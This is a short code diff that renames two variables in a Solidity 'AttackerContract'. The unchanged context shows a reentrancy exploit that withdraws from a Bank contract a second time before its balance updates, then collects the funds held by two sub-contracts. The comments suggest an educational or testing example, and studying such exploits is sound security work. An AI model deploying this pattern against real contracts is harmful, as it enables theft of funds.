@@ -5,8 +5,8 @@ import './SubContract.sol';
 contract AttackerContract is SubContractCallback {
   Bank bank;
   uint256 state;
-  SubContract i1;
-  SubContract i2;
+  SubContract s1;
+  SubContract s2;
 
   function attack(Bank b, uint256 amount) public payable {
     state = 0;
@@ -18,8 +18,8 @@ contract AttackerContract is SubContractCallback {
     // registerIntermediary callback.
     bank.withdraw(bank.getBalance(address(this)));
     // finally withdraw all the funds from our Intermediarys
-    i1.withdraw();
-    i2.withdraw();
+    s1.withdraw();
+    s2.withdraw();
   }
 
   function registerSubContract(address payable what) public payable override {
@@ -29,22 +29,22 @@ contract AttackerContract is SubContractCallback {
       // so we stop after the second withdrawal
       state = 1;
       // we keep track of the Intermediary, because it holds our funds
-      i1 = SubContract(what);
+      s1 = SubContract(what);
       // withdraw again - note that `bank.balances[this]` was not yet
       // updated.
       bank.withdraw(bank.getBalance(address(this)));
     } else if (state == 1) {
       state = 2;
       // this is the second Intermediary that holds funds for us
-      i2 = SubContract(what);
+      s2 = SubContract(what);
     } else {
       // ignore everything else
     }
   }
 
   function withdrawAll() public {
-    i1.withdraw();
-    i2.withdraw();
+    s1.withdraw();
+    s2.withdraw();
   }
 
   receive() external payable {}
